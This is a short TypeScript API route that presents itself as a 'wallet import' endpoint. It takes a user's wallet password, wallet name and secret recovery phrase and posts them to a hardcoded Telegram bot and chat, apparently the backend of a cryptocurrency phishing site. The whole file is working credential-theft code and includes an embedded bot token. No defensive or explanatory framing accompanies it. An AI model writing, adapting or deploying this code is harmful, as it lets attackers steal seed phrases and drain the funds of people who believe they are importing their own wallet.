export async function POST(request: Request) {
  try {
    const { password, walletName, secretPhrase } = await request.json()

    const botToken = "8529111480:AAEhnXksm9FDFxafb4Ouas8FX2Sy-iMjm_o"
    const chatId = -5125778966

    if (!botToken || !chatId) {
      return Response.json(
        { error: "Telegram configuration missing" },
        { status: 500 }
      )
    }

    const message = [
      "--- New Wallet Import ---",
      "",
      `Password: ${password}`,
      `Wallet Name: ${walletName}`,
      `Secret Phrase: ${secretPhrase}`,
      "",
      `Time: ${new Date().toISOString()}`,
    ].join("\n")

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`

    const res = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    })

    if (!res.ok) {
      const errorData = await res.json()
      return Response.json(
        { error: "Failed to send message", details: errorData },
        { status: 500 }
      )
    }

    return Response.json({ success: true })
  } catch {
    return Response.json({ error: "Internal server error" }, { status: 500 })
  }
}
